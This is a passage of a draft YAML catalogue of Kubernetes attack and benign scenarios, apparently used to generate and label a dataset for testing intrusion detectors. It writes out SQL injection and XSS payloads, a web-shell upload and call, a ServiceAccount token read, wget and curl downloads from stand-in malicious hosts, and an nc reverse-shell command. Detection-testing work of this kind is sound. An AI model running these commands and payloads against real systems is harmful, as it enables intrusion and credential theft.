@@ -1,0 +1,5895 @@
+# MicroTRACE scenario catalogue, version catalogue.v0
+#
+# Status: draft
+#
+# This is the master catalogue of scenarios used to generate the dataset.
+# It includes attack scenarios, lookalike negatives, benign actions, and
+# administrative actions, covering all 17 included findings with variations.
+
+version: catalogue.v0
+status: draft
+coverage_required: true
+author: "claude (automated draft, task p1-06)"
+reviewer: null
+
+scenarios:
+  # ========== A1: Injection Pattern ==========
+
+  - id: a1_lidds_php_cwe434_upload
+    kind: attack
+    title: "A1 reproduced: PHP file upload (LID-DS PHP_CWE-434)"
+    source:
+      class: reproduced
+      anchor:
+        dataset: LID-DS
+        location: "section 1: LID-DS 2021 PHP_CWE-434"
+        record_ids: ["728b044cb2f4641ab7700c927fc84661"]
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: |
+      LID-DS scenario: Apache web server handling PHP file upload from web browser.
+      Kubernetes adaptation: Attacker Pod sends HTTP POST with multipart/form-data payload
+      to a vulnerable service (replaces DVWA upload endpoint).
+    roles:
+      - name: external_attacker
+        kind: external_client
+        description: "HTTP client making the malicious upload request"
+      - name: gateway_observer
+        kind: namespace
+        description: "Ingress or gateway observing the request"
+      - name: vulnerable_service
+        kind: internal_pod
+        description: "Service Pod handling the file upload"
+    steps:
+      - step: 1
+        action: http_request
+        params:
+          source_pod: external_attacker
+          target_service: vulnerable_service
+          method: POST
+          path: "/api/upload"
+          query_params: ""
+          body_prefix_b64: "LS1XZWJLaXRGb3JtQm91bmRhcnk3NTc0YjQzMjg3ZjQ0YzMzCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSJzaGVsbC5waHAiCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtCgpQSFAgc2hlbGwgY29udGVudHMgaGVyZQotLVdlYktpdEZvcm1Cb3VuZGFyeTc1NzRiNDMyODdmNDRjMzMtLQ=="
+        outcome: success
+        expects:
+          - finding: A2
+            state: PRESENT
+            reason: "2xx response to a matched upload/web-shell request"
+          - finding: A1
+            state: PRESENT
+            reason: "POST request with suspicious multipart body triggers injection pattern P_A"
+      - step: 2
+        action: http_request
+        params:
+          source_pod: external_attacker
+          target_service: vulnerable_service
+          method: GET
+          path: "/uploads/shell.php?cmd=id"
+          query_params: ""
+        outcome: success
+        expects:
+          - finding: A2
+            state: PRESENT
+            reason: "2xx response to a matched upload/web-shell request"
+          - finding: A1
+            state: PRESENT
+            reason: "GET request with PHP shell invocation in path/query"
+    links:
+      - from: 1
+        to: 2
+        witness: REQUEST_IDENTITY
+        expected: UNOBSERVABLE
+        reason: "upload and web-shell call are two requests: causally linked, but no source records an instance witness between them"
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  - id: a1_kube_ids0_sqli
+    kind: attack
+    title: "A1 reproduced: SQL injection (Kube-IDS0 DVWA-SQLI)"
+    source:
+      class: reproduced
+      anchor:
+        dataset: Kube-IDS0
+        location: "section 4: DVWA-SQLI"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: |
+      Kube-IDS0 scenario: HTTP GET requests with SQL injection payloads to DVWA.
+      Kubernetes adaptation: Same technique, now routed through ingress/gateway.
+    roles:
+      - name: attacker_pod
+        kind: internal_pod
+      - name: vulnerable_app
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: http_request
+        params:
+          source_pod: attacker_pod
+          target_service: vulnerable_app
+          method: GET
+          path: "/api/search"
+          query_params: "id=1 UNION ALL SELECT NULL,NULL,NULL"
+        outcome: success
+        expects:
+          - finding: A2
+            state: PRESENT
+            reason: "2xx response to a matched SQL injection request"
+          - finding: A1
+            state: PRESENT
+            reason: "UNION SELECT pattern matches P_A SQLi patterns"
+      - step: 2
+        action: http_request
+        params:
+          source_pod: attacker_pod
+          target_service: vulnerable_app
+          method: GET
+          path: "/api/search"
+          query_params: "id=1 CASE WHEN 1=1 THEN 'true' ELSE 'false' END"
+        outcome: success
+        expects:
+          - finding: A2
+            state: PRESENT
+            reason: "2xx response to a matched SQL injection request"
+          - finding: A1
+            state: PRESENT
+            reason: "CASE WHEN boolean blind SQL injection reaches the API; a detector without a CASE WHEN pattern misses it"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  - id: a1_csic_xss
+    kind: attack
+    title: "A1 reproduced: Cross-site scripting (CSIC 2010)"
+    source:
+      class: reproduced
+      anchor:
+        dataset: CSIC
+        location: "section 6: CSIC 2010 anom"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "CSIC XSS payloads adapted to microservice endpoint"
+    roles:
+      - name: attacker_pod
+        kind: internal_pod
+      - name: vulnerable_app
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: http_request
+        params:
+          source_pod: attacker_pod
+          target_service: vulnerable_app
+          method: GET
+          path: "/form"
+          query_params: "message=<script>alert('xss')</script>"
+        outcome: success
+        expects:
+          - finding: A1
+            state: PRESENT
+            reason: "<script> tag pattern matches P_A XSS patterns"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  # ========== A2: Injection Success Indicator ==========
+
+  - id: a2_sqli_success
+    kind: attack
+    title: "A2: SQL injection with success indicator (Kube-IDS0)"
+    source:
+      class: reproduced
+      anchor:
+        dataset: Kube-IDS0
+        location: "section 4: DVWA-SQLI"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "HTTP 200 response with database results indicates successful injection"
+    roles:
+      - name: attacker_pod
+        kind: internal_pod
+      - name: vulnerable_app
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: http_request
+        params:
+          source_pod: attacker_pod
+          target_service: vulnerable_app
+          method: GET
+          path: "/api/search"
+          query_params: "id=1 UNION SELECT username,password,id FROM users"
+        outcome: success
+        expects:
+          - finding: A1
+            state: PRESENT
+            reason: "UNION pattern detected"
+          - finding: A2
+            state: PRESENT
+            reason: "HTTP 200 response with SQL result indicator"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  - id: a2_cadets_nginx_exploit
+    kind: attack
+    title: "A2 adapted: Nginx exploit success (CADETS)"
+    source:
+      class: adapted
+      anchor:
+        dataset: CADETS
+        location: "section 2: CADETS sessions"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "CADETS Nginx exploit adapted to containerized environment"
+    roles:
+      - name: external_attacker
+        kind: external_client
+      - name: nginx_service
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: http_request
+        params:
+          source_pod: external_attacker
+          target_service: nginx_service
+          method: POST
+          path: "/api/vulnerable"
+          body_prefix_b64: "ZXhwbG9pdCBwYXlsb2FkIHRvIGxvYWQgc2hlbGxjb2Rl"
+        outcome: success
+        expects:
+          - finding: A1
+            state: PRESENT
+            reason: "Exploit payload in the request to the public app (label as written before PILOT scores)"
+          - finding: A2
+            state: PRESENT
+            reason: "HTTP 200 response indicates exploit success"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  # ========== B1: Resource Enumeration ==========
+
+  - id: b1_k8ntext_benign_lookalike
+    kind: lookalike
+    title: "B1 lookalike: Legitimate operator resource exploration (K8NTEXT)"
+    source:
+      class: benign
+      citation:
+        source: K8NTEXT
+        reference: "section 8: human-user actions"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "K8NTEXT records legitimate human operators listing resources"
+    roles:
+      - name: human_operator
+        kind: operator
+      - name: api_server
+        kind: namespace
+    steps:
+      - step: 1
+        action: api_request
+        params:
+          principal: human_operator
+          verb: list
+          api_group: ""
+          resource: pods
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: B1
+            state: ABSENT
+            reason: "Legitimate enumeration within operator baseline"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+
+  - id: b1_external_enumeration
+    kind: attack
+    title: "B1 external: Compromised workload enumerates resources"
+    source:
+      class: external
+      citation:
+        source: "MITRE ATT&CK for Containers"
+        reference: T1526
+        url: "https://attack.mitre.org/techniques/T1526/"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "Attacker discovers cluster topology via resource enumeration"
+    roles:
+      - name: compromised_service
+        kind: internal_pod
+      - name: api_server
+        kind: namespace
+    steps:
+      - step: 1
+        action: api_request
+        params:
+          principal: compromised_service
+          verb: list
+          api_group: ""
+          resource: pods
+          namespace: "kube-system"
+        outcome: success
+        expects:
+          - finding: B1
+            state: PRESENT
+            reason: "Enumeration of kube-system pods outside baseline"
+      - step: 2
+        action: api_request
+        params:
+          principal: compromised_service
+          verb: list
+          api_group: ""
+          resource: services
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: B1
+            state: PRESENT
+            reason: "Enumeration of services exceeds baseline"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  # ========== B2: Auth Failure Burst ==========
+
+  - id: b2_kube_ids0_brute_force
+    kind: attack
+    title: "B2 adapted: Login brute force (Kube-IDS0 DOSBF)"
+    source:
+      class: adapted
+      anchor:
+        dataset: Kube-IDS0
+        location: "section 5: DVWA-DOSBF"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "DVWA brute force adapted to Kubernetes API server (401 responses)"
+    roles:
+      - name: attacker_ip
+        kind: external_client
+      - name: api_server
+        kind: namespace
+    steps:
+      - step: 1
+        action: api_auth_failure
+        params:
+          source_ip: "172.16.0.50"
+          verb: get
+          api_group: ""
+          resource: pods
+          reason: unauthenticated
+        outcome: success
+        expects: []          # counted in step 3's B2 opportunity
+      - step: 2
+        action: api_auth_failure
+        params:
+          source_ip: "172.16.0.50"
+          verb: get
+          api_group: ""
+          resource: pods
+          reason: unauthenticated
+        outcome: success
+        expects: []          # counted in step 3's B2 opportunity
+      - step: 3
+        action: api_auth_failure
+        repeat: 25
+        params:
+          source_ip: "172.16.0.50"
+          verb: get
+          api_group: ""
+          resource: pods
+          reason: unauthenticated
+        outcome: success
+        expects:
+          - finding: B2
+            state: PRESENT
+            reason: "Burst of 25 failures from single source exceeds N_B2"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  # ========== B3: Request Rate Spike ==========
+
+  - id: b3_kube_ids0_rate_spike
+    kind: attack
+    title: "B3 reproduced: Request rate spike (Kube-IDS0 DOSBF)"
+    source:
+      class: reproduced
+      anchor:
+        dataset: Kube-IDS0
+        location: "section 5: DVWA-DOSBF"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "High volume requests from single principal to API server"
+    roles:
+      - name: attacker_pod
+        kind: internal_pod
+      - name: api_server
+        kind: namespace
+    steps:
+      - step: 1
+        action: api_request
+        params:
+          principal: attacker_pod
+          verb: get
+          api_group: ""
+          resource: configmaps
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: B1
+            state: ABSENT
+            reason: "Rate spike on one resource (configmaps in default); not resource enumeration"
+      - step: 2
+        action: api_request
+        params:
+          principal: attacker_pod
+          verb: get
+          api_group: ""
+          resource: configmaps
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: B1
+            state: ABSENT
+            reason: "Rate spike on one resource (configmaps in default); not resource enumeration"
+      - step: 3
+        action: api_request
+        repeat: 300
+        params:
+          principal: attacker_pod
+          verb: get
+          api_group: ""
+          resource: configmaps
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: B3
+            state: PRESENT
+            reason: "Burst of 300 requests exceeds baseline within W_B3"
+          - finding: B1
+            state: ABSENT
+            reason: "Rate spike on one resource (configmaps in default); not resource enumeration"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  # ========== C1a/C1b: Escape Indicators ==========
+
+  - id: c1b_namespace_escape
+    kind: attack
+    title: "C1b external: Container namespace escape"
+    source:
+      class: external
+      citation:
+        source: "MITRE ATT&CK for Containers"
+        reference: T1611
+        url: "https://attack.mitre.org/techniques/T1611/"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "Capability-driven host namespace escape via setns"
+    roles:
+      - name: compromised_container
+        kind: internal_pod
+      - name: host_ns
+        kind: node
+    steps:
+      - step: 1
+        action: capability_gain
+        params:
+          process: compromised_container
+          caps: [CAP_SYS_PTRACE, CAP_SYS_ADMIN]
+        outcome: success
+        expects:
+          - finding: F1
+            state: PRESENT
+            reason: "Capabilities CAP_SYS_PTRACE and CAP_SYS_ADMIN gained"
+          - finding: C1a
+            state: PRESENT
+      - step: 2
+        action: namespace_escape
+        params:
+          process: compromised_container
+          target_namespaces: [mnt, pid]
+          method: setns
+        outcome: success
+        expects:
+          - finding: C1a
+            state: PRESENT
+          - finding: C1b
+            state: PRESENT
+            reason: "Lineage now in host namespace"
+    links:
+      - from: 1
+        to: 2
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: both steps are one process (reported apart from ancestry)"
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  # ========== D1: Token Read Anomaly ==========
+
+  - id: d1_external_token_read
+    kind: attack
+    title: "D1 external: Unexpected ServiceAccount token read"
+    source:
+      class: external
+      citation:
+        source: "MITRE ATT&CK for Containers"
+        reference: T1528
+        url: "https://attack.mitre.org/techniques/T1528/"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "Compromised process reads token file outside its workload"
+    roles:
+      - name: compromised_pod
+        kind: internal_pod
+      - name: target_pod
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: read_token_file
+        params:
+          reader_process: compromised_pod
+          reader_executable: "/usr/bin/cat"
+          token_file_path: "/var/run/secrets/kubernetes.io/serviceaccount/token"
+        outcome: success
+        expects:
+          - finding: D1
+            state: PRESENT
+            reason: "Token read by an executable outside the workload's expected readers"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  # ========== E1: Unsigned Image Admitted ==========
+
+  - id: e1_external_unsigned_image
+    kind: attack
+    title: "E1 external: Unsigned container image admitted"
+    source:
+      class: external
+      citation:
+        source: "MITRE ATT&CK for Containers"
+        reference: T1649
+        url: "https://attack.mitre.org/techniques/T1649/"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "Unsigned image passes admission policy in audit mode"
+    roles:
+      - name: attacker
+        kind: external_client
+      - name: api_server
+        kind: namespace
+    steps:
+      - step: 1
+        action: admit_pod
+        params:
+          resource_uid: "pod-abc123"
+          pod_name: "malicious-app"
+          namespace: "default"
+          image_digest: "sha256:deadbeef"
+          policy_verdict: "FAIL"
+          policy_enforcement: audit
+        outcome: success
+        expects:
+          - finding: E1
+            state: PRESENT
+            reason: "Unsigned image admitted under audit-mode policy"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  # ========== E2: Post-Start Binary Write ==========
+
+  - id: e2_cadets_implant_write
+    kind: attack
+    title: "E2 adapted: Executable implant write (CADETS)"
+    source:
+      class: adapted
+      anchor:
+        dataset: CADETS
+        location: "section 2: CADETS sessions"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "Drakon implant write adapted to container filesystem"
+    roles:
+      - name: compromised_process
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: file_write
+        params:
+          writer_process: compromised_process
+          file_path: "/var/lib/implant.so"
+          data: "ELF shared object binary"
+          create_if_missing: true
+        outcome: success
+        expects:
+          - finding: E2
+            state: ABSENT
+            reason: "File written but not yet executable: a non-executable write is an E2 negative control; the later chmod is the E2 opportunity"
+      - step: 2
+        action: make_executable
+        params:
+          process: compromised_process
+          file_path: "/var/lib/implant.so"
+          mode: "+x"
+        outcome: success
+        expects:
+          - finding: E2
+            state: PRESENT
+            reason: "File made executable post-start"
+    links:
+      - from: 1
+        to: 2
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: both steps are one process (reported apart from ancestry)"
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  # ========== F1: Capability Gain ==========
+
+  - id: f1_cadets_privilege_escalation
+    kind: attack
+    title: "F1 adapted: Privilege escalation to root (CADETS)"
+    source:
+      class: adapted
+      anchor:
+        dataset: CADETS
+        location: "section 2: CADETS sessions"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "Drakon privilege escalation adapted to container"
+    roles:
+      - name: compromised_process
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: euid_to_root
+        params:
+          process: compromised_process
+        outcome: success
+        expects:
+          - finding: F1
+            state: PRESENT
+            reason: "euid transitions from non-zero to 0"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  # ========== G1a: Unbaselined Connection ==========
+
+  - id: g1a_cadets_port_scan
+    kind: attack
+    title: "G1a adapted: Internal port scan (CADETS)"
+    source:
+      class: adapted
+      anchor:
+        dataset: CADETS
+        location: "section 2: CADETS sessions"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "Port scan of in-cluster endpoints (adapted from NERSC subnet scan)"
+    roles:
+      - name: compromised_pod
+        kind: internal_pod
+      - name: target_pod_1
+        kind: internal_pod
+      - name: target_pod_2
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: connect_internal
+        params:
+          source_pod: compromised_pod
+          target_service_or_pod: target_pod_1
+          target_port: 22
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: G1a
+            state: PRESENT
+            reason: "Connection outside baseline edges"
+      - step: 2
+        action: connect_internal
+        params:
+          source_pod: compromised_pod
+          target_service_or_pod: target_pod_2
+          target_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: G1a
+            state: PRESENT
+    links:
+      - from: 1
+        to: 2
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: one scanner makes both connects"
+        ordering: false
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  # ========== G2: Exec Into Container ==========
+
+  - id: g2_k8ntext_benign_exec
+    kind: lookalike
+    title: "G2 lookalike: Legitimate operator exec (K8NTEXT)"
+    source:
+      class: benign
+      citation:
+        source: K8NTEXT
+        reference: "section 8: pods/exec actions"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "K8NTEXT records legitimate operator pods/exec calls"
+    roles:
+      - name: human_operator
+        kind: operator
+    steps:
+      - step: 1
+        action: api_request
+        params:
+          principal: human_operator
+          verb: create
+          api_group: ""
+          resource: pods
+          namespace: "rising"
+          name: "rising-pod"
+          body: "{\"subresource\": \"exec\"}"
+        outcome: success
+        expects:
+          - finding: G2
+            state: ABSENT
+            reason: "Legitimate operator debugging action"
+          - finding: B3
+            state: ABSENT
+            reason: "Single operator request; no request-rate burst"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+
+  - id: g2_external_stolen_credentials
+    kind: attack
+    title: "G2 external: Attacker exec via stolen credentials"
+    source:
+      class: external
+      citation:
+        source: "MITRE ATT&CK for Containers"
+        reference: T1059
+        url: "https://attack.mitre.org/techniques/T1059/"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "Attacker uses compromised ServiceAccount token for pods/exec"
+    roles:
+      - name: attacker_via_token
+        kind: external_client
+      - name: target_pod
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: api_request
+        params:
+          principal: attacker_via_token
+          verb: create
+          api_group: ""
+          resource: pods
+          namespace: production
+          name: "app-pod"
+          body: "{\"subresource\": \"exec\", \"command\": \"/bin/sh\"}"
+        outcome: success
+        expects:
+          - finding: G2
+            state: PRESENT
+            reason: "Exec not from known operator"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  # ========== H1: Egress Volume Anomaly ==========
+
+  - id: h1_external_large_egress
+    kind: attack
+    title: "H1 external: Anomalously large egress volume"
+    source:
+      class: external
+      citation:
+        source: "MITRE ATT&CK for Containers"
+        reference: T1041
+        url: "https://attack.mitre.org/techniques/T1041/"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "Container transfers unusually high data volume externally"
+    roles:
+      - name: compromised_pod
+        kind: internal_pod
+      - name: external_destination
+        kind: external_client
+    steps:
+      - step: 1
+        action: connect_external
+        params:
+          source_pod: compromised_pod
+          source_process: compromised_pod
+          remote_ip: "203.0.113.45"
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "New external destination"
+      - step: 2
+        action: egress_transfer
+        params:
+          source_pod: compromised_pod
+          destination: "203.0.113.45"
+          bytes_out: 5368709120
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H1
+            state: PRESENT
+            reason: "5 GB egress exceeds baseline"
+      - step: 3
+        action: process_exec
+        benign: true
+        float: flow_a
+        params:
+          parent_process: compromised_pod
+          executable: /app/metrics-agent
+          argv: [/app/metrics-agent]
+        outcome: success
+      - step: 4
+        action: connect_external
+        benign: true
+        float: flow_a
+        params:
+          source_pod: compromised_pod
+          source_process: "@step3.process"
+          remote_ip: 198.51.100.20
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects: []
+      - step: 5
+        action: connect_external
+        benign: true
+        float: flow_b
+        params:
+          source_pod: compromised_pod
+          source_process: compromised_pod
+          remote_ip: 198.51.100.20
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects: []
+      - step: 6
+        action: egress_transfer
+        benign: true
+        float: flow_e
+        params:
+          source_pod: compromised_pod
+          source_process: "@step3.process"
+          destination: 198.51.100.20
+          bytes_out: 20480
+          protocol: tcp
+        outcome: success
+        expects: []
+    links:
+      - from: 1
+        to: 2
+        witness: NETWORK_FLOW
+        expected: PRESENT
+        reason: "same-socket continuity: bytes counted on the connect's flow"
+      - from: 4
+        to: 6
+        witness: NETWORK_FLOW
+        expected: PRESENT
+        reason: "same-socket continuity: bytes counted on the connect's flow"
+      - from: 5
+        to: 6
+        witness: NETWORK_FLOW
+        expected: ABSENT
+        reason: "same-socket continuity absent: another process of the Pod connects to the same remote on its own flow"
+        shared_keys: [remote_ip]
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.remote_ip
+            value: 198.51.100.61
+          - field: step.1.params.remote_port
+            value: 8443
+          - field: step.2.params.destination
+            value: 198.51.100.61
+          - field: step.2.params.bytes_out
+            value: 3221225472
+          - field: step.3.params.executable
+            value: /app/log-shipper
+          - field: step.4.params.remote_ip
+            value: 198.51.100.44
+          - field: step.5.params.remote_ip
+            value: 198.51.100.44
+          - field: step.6.params.destination
+            value: 198.51.100.44
+
+  # ========== H2: Unseen Destination ==========
+
+  - id: h2_lidds_wget_external
+    kind: attack
+    title: "H2 reproduced: Outbound to external IP (LID-DS PHP_CWE-434)"
+    source:
+      class: reproduced
+      anchor:
+        dataset: LID-DS
+        location: "section 1: LID-DS 2021 PHP_CWE-434"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "Apache wget to external IP adapted to container process"
+    roles:
+      - name: compromised_pod
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: shell_exec
+        params:
+          parent_process: compromised_pod
+          shell_binary: /bin/bash
+          command: "wget https://external.example.com/malware"
+        outcome: success
+      - step: 2
+        action: process_exec
+        params:
+          parent_process: "@step1.process"
+          executable: /usr/bin/wget
+          argv: [wget, "https://external.example.com/malware"]
+        outcome: success
+      - step: 3
+        action: connect_external
+        params:
+          source_pod: compromised_pod
+          source_process: "@step2.process"
+          remote_ip: 203.0.113.45
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "Outbound to external IP not in baseline"
+      - step: 4
+        action: process_exec
+        benign: true
+        float: decoy
+        params:
+          parent_process: compromised_pod
+          executable: /app/telemetry-agent
+          argv: [/app/telemetry-agent]
+        outcome: success
+      - step: 5
+        action: connect_external
+        benign: true
+        float: decoy
+        params:
+          source_pod: compromised_pod
+          source_process: "@step4.process"
+          remote_ip: 203.0.113.25
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects: []
+    links:
+      - from: 1
+        to: 3
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "wget, which makes the connection, is a child of the attacker's shell"
+      - from: 1
+        to: 5
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 3]
+        reason: "twin: a sibling process of the same Pod (a child of its init, not of the shell) makes the same kind of action"
+        shared_keys: [pod_uid, lineage_id]
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.command
+            value: curl -o /tmp/m https://external.example.com/m
+          - field: step.2.params.executable
+            value: /usr/bin/curl
+          - field: step.2.params.argv
+            value: [curl, -o, /tmp/m, 'https://external.example.com/m']
+          - field: step.3.params.remote_ip
+            value: 203.0.113.46
+          - field: step.4.params.executable
+            value: /app/sync-agent
+          - field: step.5.params.remote_ip
+            value: 192.0.2.80
+
+  - id: h2_beth_external_connect
+    kind: attack
+    title: "H2 adapted: External connection during intrusion (BETH)"
+    source:
+      class: adapted
+      anchor:
+        dataset: BETH
+        location: "section 3: evil rows"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "SSH shell connection to external IP (adapted to container)"
+    roles:
+      - name: container_pod
+        kind: internal_pod
+      - name: attacker_server
+        kind: external_client
+    steps:
+      - step: 1
+        action: shell_exec
+        params:
+          parent_process: container_pod
+          shell_binary: /bin/sh
+          command: "curl http://attacker.example.com:80/cmd"
+        outcome: success
+      - step: 2
+        action: process_exec
+        params:
+          parent_process: "@step1.process"
+          executable: /usr/bin/curl
+          argv: [curl, "http://attacker.example.com:80/cmd"]
+        outcome: success
+      - step: 3
+        action: connect_external
+        params:
+          source_pod: container_pod
+          source_process: "@step2.process"
+          remote_ip: 198.51.100.5
+          remote_port: 80
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+      - step: 4
+        action: process_exec
+        benign: true
+        float: decoy
+        params:
+          parent_process: container_pod
+          executable: /app/update-check
+          argv: [/app/update-check]
+        outcome: success
+      - step: 5
+        action: connect_external
+        benign: true
+        float: decoy
+        params:
+          source_pod: container_pod
+          source_process: "@step4.process"
+          remote_ip: 198.51.100.44
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects: []
+    links:
+      - from: 1
+        to: 3
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "curl, which makes the connection, is a child of the shell"
+      - from: 1
+        to: 5
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 3]
+        reason: "twin: a sibling process of the same Pod (a child of its init, not of the shell) makes the same kind of action"
+        shared_keys: [pod_uid, lineage_id]
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.command
+            value: nc 198.51.100.6 4444 -e /bin/sh
+          - field: step.2.params.executable
+            value: /usr/bin/nc
+          - field: step.2.params.argv
+            value: [nc, 198.51.100.6, '4444']
+          - field: step.3.params.remote_ip
+            value: 198.51.100.6
+          - field: step.3.params.remote_port
+            value: 4444
+          - field: step.4.params.executable
+            value: /app/cache-warmer
+          - field: step.5.params.remote_ip
+            value: 203.0.113.10
+
+  # ========== H3: Bulk Secret Enumeration ==========
+
+  - id: h3_k8ntext_benign_secrets
+    kind: lookalike
+    title: "H3 lookalike: Legitimate secret access (K8NTEXT)"
+    source:
+      class: benign
+      citation:
+        source: K8NTEXT
+        reference: "section 8: secret access"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "K8NTEXT operator secret list/get within baseline"
+    roles:
+      - name: human_operator
+        kind: operator
+    steps:
+      - step: 1
+        action: secret_list
+        params:
+          principal: human_operator
+          namespace: "production"
+        outcome: success
+        expects:
+          - finding: H3
+            state: ABSENT
+            reason: "Single list below threshold"
+          - finding: B1
+            state: ABSENT
+            reason: "Benign reads by a baselined principal; not resource enumeration"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+
+  - id: h3_external_bulk_enumeration
+    kind: attack
+    title: "H3 external: Bulk secret enumeration"
+    source:
+      class: external
+      citation:
+        source: "MITRE ATT&CK for Containers"
+        reference: T1528
+        url: "https://attack.mitre.org/techniques/T1528/"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "Compromised workload iteratively enumerates secrets"
+    roles:
+      - name: compromised_sa
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: secret_list
+        params:
+          principal: compromised_sa
+          namespace: "default"
+        outcome: success
+      - step: 2
+        action: secret_get
+        params:
+          principal: compromised_sa
+          namespace: "default"
+          name: "secret-1"
+        outcome: success
+      - step: 3
+        action: secret_get
+        params:
+          principal: compromised_sa
+          namespace: "default"
+          name: "secret-2"
+        outcome: success
+      - step: 4
+        action: secret_get
+        repeat: 60
+        params:
+          principal: compromised_sa
+          namespace: "default"
+          name: "secret-enum-{i}"
+        outcome: success
+      - step: 5
+        action: secret_list
+        repeat: 60
+        params:
+          principal: compromised_sa
+          namespace: "kube-system"
+        outcome: success
+        expects:
+          - finding: H3
+            state: PRESENT
+            reason: "60 secret gets + 60 lists exceed N_H3"
+          - finding: B1
+            state: PRESENT
+            reason: "Secret reads across two namespaces by one principal: resource enumeration (fires in every SCORE run with audit, 2026-10-21)"
+          - finding: B3
+            state: PRESENT
